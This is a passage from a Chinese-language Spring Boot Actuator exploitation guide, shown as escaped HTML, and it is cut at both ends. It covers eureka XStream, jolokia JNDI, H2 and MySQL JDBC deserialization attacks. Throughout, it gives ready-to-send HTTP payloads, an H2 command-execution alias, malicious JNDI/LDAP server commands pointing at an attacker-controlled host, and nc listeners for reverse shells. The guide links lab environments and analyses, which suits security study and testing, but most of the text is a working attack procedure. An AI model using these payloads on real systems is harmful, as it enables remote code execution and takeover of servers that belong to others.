RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt; &#xA; &lt;li&gt;目标使用的 &lt;code&gt;eureka-client&lt;/code&gt; &amp;lt; 1.8.7（通常包含在 &lt;code&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖中）&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/h5&gt; &#xA;&lt;p&gt;提供一个依赖 Flask 并符合要求的 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py&#34;&gt;python 脚本示例&lt;/a&gt;，作用是利用目标 Linux 机器上自带的 python 来反弹shell。&lt;/p&gt; &#xA;&lt;p&gt;使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：监听反弹 shell 的端口&lt;/h5&gt; &#xA;&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvp 443&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;eureka.client.serviceUrl.defaultZone&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤四：刷新配置&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /refresh&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/refresh&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址&lt;/li&gt; &#xA; &lt;li&gt;refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload&lt;/li&gt; &#xA; &lt;li&gt;目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://www.freebuf.com/column/234719.html&#34;&gt;Spring Boot Actuator从未授权访问到getshell&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce&#34;&gt;repository/springboot-eureka-xstream-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9093/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x04：jolokia logback JNDI RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;目标网站存在 &lt;code&gt;/jolokia&lt;/code&gt; 或 &lt;code&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;目标使用了 &lt;code&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;普通 JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt; &#xA;&lt;p&gt;访问 &lt;code&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 和 &lt;code&gt;reloadByURL&lt;/code&gt; 关键词。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：托管 xml 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在根目录放置以 &lt;code&gt;xml&lt;/code&gt; 结尾的 &lt;code&gt;example.xml&lt;/code&gt; 文件，内容如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;configuration&amp;gt;&#xA;  &amp;lt;insertFromJNDI env-entry-name=&#34;ldap://your-vps-ip:1389/JNDIObject&#34; as=&#34;appName&#34; /&amp;gt;&#xA;&amp;lt;/configuration&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：准备要执行的 Java 代码&lt;/h5&gt; &#xA;&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&#34;&gt;Java 示例代码&lt;/a&gt; &lt;code&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt; &#xA;&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;javac -source 1.5 -target 1.5 JNDIObject.java&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;然后将生成的 &lt;code&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt; &#xA;&lt;h5&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt; &#xA;&lt;p&gt;下载 &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt; &#xA;&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lv 443&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/h5&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;替换实际的 your-vps-ip 地址访问 URL 触发漏洞：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 &lt;code&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 类的 &lt;code&gt;reloadByURL&lt;/code&gt; 方法&lt;/li&gt; &#xA; &lt;li&gt;目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容&lt;/li&gt; &#xA; &lt;li&gt;目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)&lt;/li&gt; &#xA; &lt;li&gt;xml 文件中利用 &lt;code&gt;logback&lt;/code&gt; 依赖的 &lt;code&gt;insertFormJNDI&lt;/code&gt; 标签，设置了外部 JNDI 服务器地址&lt;/li&gt; &#xA; &lt;li&gt;目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://xz.aliyun.com/t/4258&#34;&gt;spring boot actuator rce via jolokia&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&#34;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9094/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x05：jolokia Realm JNDI RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;目标网站存在 &lt;code&gt;/jolokia&lt;/code&gt; 或 &lt;code&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt; &#xA; &lt;li&gt;目标使用了 &lt;code&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt; &#xA; &lt;li&gt;普通 JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt; &#xA;&lt;p&gt;访问 &lt;code&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code&gt;type=MBeanFactory&lt;/code&gt; 和 &lt;code&gt;createJNDIRealm&lt;/code&gt; 关键词。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt; &#xA;&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&#34;&gt;Java 示例代码&lt;/a&gt; &lt;code&gt;JNDIObject.java&lt;/code&gt;。&lt;/p&gt; &#xA;&lt;h5&gt;步骤三：托管 class 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt; &#xA;&lt;h5&gt;步骤四：架设恶意 rmi 服务&lt;/h5&gt; &#xA;&lt;p&gt;下载 &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 rmi 服务：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt; &#xA;&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvp 443&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤六：发送恶意 payload&lt;/h5&gt; &#xA;&lt;p&gt;根据实际情况修改 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py&#34;&gt;springboot-realm-jndi-rce.py&lt;/a&gt; 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。&lt;/p&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm&lt;/li&gt; &#xA; &lt;li&gt;设置 connectionURL 地址为 RMI Service URL&lt;/li&gt; &#xA; &lt;li&gt;设置 contextFactory 为 RegistryContextFactory&lt;/li&gt; &#xA; &lt;li&gt;停止 Realm&lt;/li&gt; &#xA; &lt;li&gt;启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html&#34;&gt;Yet Another Way to Exploit Spring Boot Actuators via Jolokia&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&#34;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9094/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x06：restart h2 database query RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用&lt;/li&gt; &#xA; &lt;li&gt;存在 &lt;code&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/h5&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠️ 下面payload 中的 &#39;T5&#39; 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;spring 1.x（无回显执行命令）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception{Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]{m1,m2,m3});}&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x（无回显执行命令）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.datasource.hikari.connection-test-query&#34;,&#34;value&#34;:&#34;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception{Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]{m1,m2,m3});}&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤二：重启应用&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /restart&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/restart&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 &lt;code&gt;CREATE ALIAS&lt;/code&gt; 创建自定义函数的 SQL 语句&lt;/li&gt; &#xA; &lt;li&gt;其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句&lt;/li&gt; &#xA; &lt;li&gt;restart 重启应用，会建立新的数据库连接&lt;/li&gt; &#xA; &lt;li&gt;如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&#34;&gt;remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&#34;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9096/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x07：h2 database console JNDI RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;存在 &lt;code&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt; &#xA; &lt;li&gt;spring 配置中启用 h2 console &lt;code&gt;spring.h2.console.enabled=true&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt; &#xA; &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：访问路由获得 jsessionid&lt;/h5&gt; &#xA;&lt;p&gt;直接访问目标开启 h2 console 的默认路由 &lt;code&gt;/h2-console&lt;/code&gt;，目标会跳转到页面 &lt;code&gt;/h2-console/login.jsp?jsessionid=xxxxxx&lt;/code&gt;，记录下实际的 &lt;code&gt;jsessionid=xxxxxx&lt;/code&gt; 值。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt; &#xA;&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&#34;&gt;Java 示例代码&lt;/a&gt; &lt;code&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt; &#xA;&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;javac -source 1.5 -target 1.5 JNDIObject.java&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;然后将生成的 &lt;code&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt; &#xA;&lt;h5&gt;步骤三：托管 class 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt; &#xA;&lt;h5&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt; &#xA;&lt;p&gt;下载 &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt; &#xA;&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lv 443&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤六：发包触发 JNDI 注入&lt;/h5&gt; &#xA;&lt;p&gt;根据实际情况，替换下面数据中的 &lt;code&gt;jsessionid=xxxxxx&lt;/code&gt;、&lt;code&gt;www.example.com&lt;/code&gt; 和 &lt;code&gt;ldap://your-vps-ip:1389/JNDIObject&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;POST /h2-console/login.do?jsessionid=xxxxxx&#xA;Host: www.example.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx&#xA;&#xA;language=en&amp;amp;setting=Generic+H2+%28Embedded%29&amp;amp;name=Generic+H2+%28Embedded%29&amp;amp;driver=javax.naming.InitialContext&amp;amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;amp;user=&amp;amp;password=&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ&#34;&gt;Spring Boot + H2数据库JNDI注入&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&#34;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9096/h2-console&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x08：mysql jdbc deserialization RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt; &#xA; &lt;li&gt;目标环境中存在 &lt;code&gt;mysql-connector-java&lt;/code&gt; 依赖&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：查看环境依赖&lt;/h5&gt; &#xA;&lt;p&gt;GET 请求 &lt;code&gt;/env&lt;/code&gt; 或 &lt;code&gt;/actuator/env&lt;/code&gt;，搜索环境变量（classpath）中是否有 &lt;code&gt;mysql-connector-java&lt;/code&gt; 关键词，并记录下其版本号（5.x 或 8.x）；&lt;/p&gt; &#xA;&lt;p&gt;搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 &lt;code&gt;commons-collections&lt;/code&gt;、&lt;code&gt;Jdk7u21&lt;/code&gt;、&lt;code&gt;Jdk8u20&lt;/code&gt; 等；&lt;/p&gt; &#xA;&lt;p&gt;搜索 &lt;code&gt;spring.datasource.url&lt;/code&gt; 关键词，记录下其 &lt;code&gt;value&lt;/code&gt; 值，方便后续恢复其正常 jdbc url 值。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：架设恶意 rogue mysql server&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的服务器上运行 &lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py&#34;&gt;springboot-jdbc-deserialization-rce.py&lt;/a&gt; 脚本，并使用 &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;ysoserial&lt;/a&gt; 自定义要执行的命令：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;java -jar ysoserial.jar CommonsCollections3 calc &amp;gt; payload.ser&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在脚本&lt;strong&gt;同目录下&lt;/strong&gt;生成 &lt;code&gt;payload.ser&lt;/code&gt; 反序列化 payload 文件，供脚本使用。&lt;/p&gt; &#xA;&lt;h5&gt;步骤三：设置 spring.datasource.url 属性&lt;/h5&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;mysql-connector-java 5.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;mysql-connector-java 8.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.datasource.url=对应属性值&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.datasource.url&#34;,&#34;value&#34;:&#34;对应属性值&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤四：刷新配置&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; 